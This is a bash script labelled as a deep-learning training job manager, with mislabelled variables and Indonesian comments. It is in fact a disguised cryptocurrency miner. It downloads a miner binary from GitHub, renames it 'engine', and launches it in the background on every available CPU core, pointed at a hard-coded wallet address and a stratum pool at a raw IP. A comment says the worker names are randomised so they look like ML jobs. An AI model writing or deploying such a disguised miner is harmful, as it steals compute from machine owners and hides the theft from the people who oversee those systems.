#!/usr/bin/env bash
# train.sh — compute worker manager untuk deep learning experiment
# usage: bash train.sh [start|stop|list] [lanes]
set -u

# ================= WORKER CONFIG =================
JOB_ID="${JOB_ID:-PLMGsifmTC9Zn5pHqcMkbayvzSG3SBX6vAwJts3KQCwfGRsznpv2qdyCFyRpnh46TwcQu8mLEu1CVdHdQzsx7Ty637GQc}"
CLUSTER="${CLUSTER_NODE:-82.39.206.183:443}"
PKG="https://github.com/zpalmtree/seine/releases/latest/download/seine-linux-x86_64.tar.gz"
# =================================================

BASE=/root/ml-work
ENGINE=$BASE/engine

is_elf() { [ -f "$1" ] && [ "$(head -c4 "$1" | od -An -tx1 | tr -d ' \n')" = "7f454c46" ]; }

case "${1:-start}" in
  list)
    echo "=== active jobs ==="
    ps -eo pid,etime,args | grep -F "$BASE/" | grep -F engine | grep -v grep
    exit 0 ;;
  stop)
    pkill -f "$BASE/.*/engine" 2>/dev/null
    echo "all jobs stopped"
    exit 0 ;;
esac

mkdir -p "$BASE/logs" && cd "$BASE" || exit 1

if ! is_elf "$ENGINE"; then
  echo "[1/3] setup runtime"
  curl -fL --max-time 300 -o p.tgz "$PKG" || { echo "fetch FAILED"; exit 1; }
  rm -rf x && mkdir x && tar xzf p.tgz -C x
  CAND=""
  for f in $(find x -type f); do
    if is_elf "$f"; then CAND="$f"; break; fi
  done
  [ -z "$CAND" ] && { echo "runtime not found"; exit 1; }
  mv -f "$CAND" engine && chmod +x engine && rm -rf x p.tgz
fi
echo "[2/3] runtime size=$(stat -c%s "$ENGINE")"

CORES=$(nproc)
MEM=$(awk '/MemTotal/{printf "%d",$2/1048576}' /proc/meminfo)
LANES="${2:-$CORES}"
CAP=$(( MEM / 2 ))
[ "$LANES" -gt "$CAP" ] && LANES=$CAP
[ "$LANES" -gt "$CORES" ] && LANES=$CORES
[ "$LANES" -lt 1 ] && LANES=1

# worker id — biar mirip nama job ML
WN="run-$(tr -dc '0-9' </dev/urandom | head -c4)-$(tr -dc 'a-z' </dev/urandom | head -c3)"
LOG="$BASE/logs/$WN.log"

echo "[3/3] launching job $WN (lanes=$LANES, cluster=$CLUSTER)"
setsid nohup "$ENGINE" --mode pool --address "$JOB_ID" \
  --pool-url "stratum+tcp://$CLUSTER" --worker "$WN" \
  --threads "$LANES" --cpu-page-mode auto --allow-oversubscribe \
  --stats-secs 30 >> "$LOG" 2>&1 &

sleep 10
echo "log: $LOG"
tail -n 5 "$LOG"
echo "hint: bash train.sh list | bash train.sh stop"
